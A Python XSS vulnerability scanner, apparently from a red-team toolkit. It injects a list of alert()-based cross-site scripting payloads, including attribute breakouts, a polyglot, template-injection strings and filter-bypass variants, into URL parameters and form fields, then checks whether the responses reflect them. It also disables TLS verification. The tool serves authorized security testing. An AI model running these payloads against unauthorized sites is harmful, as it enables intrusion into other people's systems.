#!/usr/bin/env python3
"""
Red Team Tools - XSS Scanner
For educational and authorized security testing only
"""

import re
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
from html.parser import HTMLParser
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils import *

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    REQUESTS_AVAILABLE = True
except Exception as e:
    REQUESTS_AVAILABLE = False
    REQUESTS_ERROR = str(e)


class FormParser(HTMLParser):
    """HTML parser to extract forms"""
    
    def __init__(self):
        super().__init__()
        self.forms = []
        self.current_form = None
    
    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        
        if tag == 'form':
            self.current_form = {
                'action': attrs.get('action', ''),
                'method': attrs.get('method', 'get').lower(),
                'inputs': []
            }
        elif self.current_form and tag in ['input', 'textarea', 'select']:
            input_info = {
                'name': attrs.get('name', ''),
                'type': attrs.get('type', 'text'),
                'value': attrs.get('value', '')
            }
            if input_info['name']:
                self.current_form['inputs'].append(input_info)
    
    def handle_endtag(self, tag):
        if tag == 'form' and self.current_form:
            self.forms.append(self.current_form)
            self.current_form = None


class XSSScanner:
    """Cross-Site Scripting vulnerability scanner"""
    
    # XSS payloads
    PAYLOADS = [
        # Basic payloads
        '<script>alert("XSS")</script>',
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        
        # Event handlers
        '" onmouseover="alert(1)"',
        "' onmouseover='alert(1)'",
        '" onfocus="alert(1)" autofocus="',
        
        # Breaking out of attributes
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
        
        # URL encoded
        '%3Cscript%3Ealert(1)%3C/script%3E',
        
        # Unicode
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        
        # Without parentheses
        '<script>alert`1`</script>',
        '<img src=x onerror=alert`1`>',
        
        # Polyglot
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
        
        # DOM-based
        '#<script>alert(1)</script>',
        
        # Template injection
        '{{constructor.constructor("alert(1)")()}}',
        '${alert(1)}',
        
        # Filter bypass
        '<ScRiPt>alert(1)</sCrIpT>',
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<script/src=data:,alert(1)>',
    ]
    
    # Patterns to detect XSS in response
    REFLECTION_PATTERNS = [
        r'<script[^>]*>.*?alert\s*\([^)]*\).*?</script>',
        r'onerror\s*=\s*["\']?alert',
        r'onload\s*=\s*["\']?alert',
        r'onmouseover\s*=\s*["\']?alert',
        r'onfocus\s*=\s*["\']?alert',
        r'<img[^>]+onerror\s*=',
        r'<svg[^>]+onload\s*=',
    ]
    
    def __init__(self, target_url: str, timeout: float = 10.0):
        self.target_url = target_url
        self.timeout = timeout
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def _get_forms(self, url: str) -> list:
        """Extract forms from a page"""
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            parser = FormParser()
            parser.feed(response.text)
            return parser.forms
        except:
            return []
    
    def _get_url_params(self, url: str) -> dict:
        """Extract URL parameters"""
        parsed = urlparse(url)
        return parse_qs(parsed.query)
    
    def _check_reflection(self, response_text: str, payload: str) -> bool:
        """Check if payload is reflected in response"""
        # Direct reflection
        if payload in response_text:
            return True
        
        # Check for unencoded reflection of key parts
        key_parts = ['<script', 'onerror=', 'onload=', 'alert(', '<img', '<svg']
        for part in key_parts:
            if part.lower() in response_text.lower():
                # Check if it's our injection
                for pattern in self.REFLECTION_PATTERNS:
                    if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
                        return True
        
        return False
    
    def _test_parameter(self, url: str, param: str, method: str = 'get', 
                       original_value: str = '') -> list:
        """Test a single parameter with all payloads"""
        results = []
        
        for payload in self.PAYLOADS:
            try:
                if method.lower() == 'get':
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param] = [payload]
                    new_query = urlencode(params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                else:
                    data = {param: payload}
                    response = self.session.post(url, data=data, timeout=self.timeout, verify=False)
                
                if self._check_reflection(response.text, payload):
                    results.append({
                        'url': url,
                        'parameter': param,
                        'method': method,
                        'payload': payload,
                        'vulnerable': True
                    })
                    break  # One payload is enough to confirm
            except Exception as e:
                continue
        
        return results
    
    def scan_url(self, url: str = None) -> list:
        """Scan URL parameters for XSS"""
        url = url or self.target_url
        
        info(f"Scanning URL: {url}")
        
        params = self._get_url_params(url)
        
        if not params:
            warning("No URL parameters found")
            return []
        
        info(f"Found {len(params)} parameters: {', '.join(params.keys())}")
        
        results = []
        for param in params:
            info(f"Testing parameter: {param}")
            vuln = self._test_parameter(url, param, 'get', params[param][0] if params[param] else '')
            results.extend(vuln)
            
            if vuln:
                success(f"XSS found in parameter: {param}")
        
        self.vulnerabilities.extend(results)
        return results
    
    def scan_forms(self, url: str = None) -> list:
        """Scan forms for XSS"""
        url = url or self.target_url
        
        info(f"Scanning forms on: {url}")
        
        forms = self._get_forms(url)
        
        if not forms:
            warning("No forms found")
            return []
        
        info(f"Found {len(forms)} forms")
        
        results = []
        for i, form in enumerate(forms):
            action_url = urljoin(url, form['action']) if form['action'] else url
            method = form['method']
            
            info(f"Testing form {i+1}: {action_url} ({method.upper()})")
            
            for inp in form['inputs']:
                if inp['type'] in ['text', 'search', 'url', 'email', 'hidden']:
                    debug(f"  Testing input: {inp['name']}")
                    
                    for payload in self.PAYLOADS[:10]:  # Test fewer payloads per form
                        try:
                            data = {inp['name']: payload}
                            # Add other inputs with default values
                            for other in form['inputs']:
                                if other['name'] != inp['name']:
                                    data[other['name']] = other['value'] or 'test'
                            
                            if method == 'post':
                                response = self.session.post(
                                    action_url, data=data, 
                                    timeout=self.timeout, verify=False
                                )
                            else:
                                response = self.session.get(
                                    action_url, params=data,
                                    timeout=self.timeout, verify=False
                                )
                            
                            if self._check_reflection(response.text, payload):
                                results.append({
                                    'url': action_url,
                                    'form': i + 1,
                                    'parameter': inp['name'],
                                    'method': method,
                                    'payload': payload,
                                    'vulnerable': True
                                })
                                success(f"XSS found in form input: {inp['name']}")
                                break
                        except:
                            continue
        
        self.vulnerabilities.extend(results)
        return results
    
    def full_scan(self, url: str = None) -> list:
        """Run full XSS scan"""
        url = url or self.target_url
        
        print(f"\n{C}{'═' * 60}{RESET}")
        print(f"{BRIGHT}XSS VULNERABILITY SCAN{RESET}")
        print(f"{C}{'═' * 60}{RESET}")
        print(f"{Y}Target:{RESET} {url}")
        print()
        
        # Scan URL parameters
        url_results = self.scan_url(url)
        
        print()
        
        # Scan forms
        form_results = self.scan_forms(url)
        
        return self.vulnerabilities
    
    def print_results(self):
        """Print scan results"""
        print(f"\n{C}{'═' * 60}{RESET}")
        print(f"{BRIGHT}XSS SCAN RESULTS{RESET}")
        print(f"{C}{'═' * 60}{RESET}")
        
        if not self.vulnerabilities:
            success("No XSS vulnerabilities found")
            return
        
        warning(f"Found {len(self.vulnerabilities)} potential XSS vulnerabilities!")
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"\n{R}[Vulnerability {i}]{RESET}")
            print(f"  URL: {vuln['url']}")
            print(f"  Parameter: {vuln['parameter']}")
            print(f"  Method: {vuln['method'].upper()}")
            print(f"  Payload: {vuln['payload'][:50]}...")


def interactive_mode():
    """Interactive mode for XSS scanning"""
    print_banner("XSS SCANNER", color="red")
    warning("For authorized security testing only!")
    
    target = prompt("Enter target URL")
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    options = [
        "Scan URL Parameters",
        "Scan Forms",
        "Full Scan (Both)"
    ]
    
    choice = menu_selector(options, "Select Scan Type")
    
    if choice == 0:
        return
    
    scanner = XSSScanner(target)
    
    if choice == 1:
        scanner.scan_url()
    elif choice == 2:
        scanner.scan_forms()
    elif choice == 3:
        scanner.full_scan()
    
    scanner.print_results()


if __name__ == "__main__":
    interactive_mode()
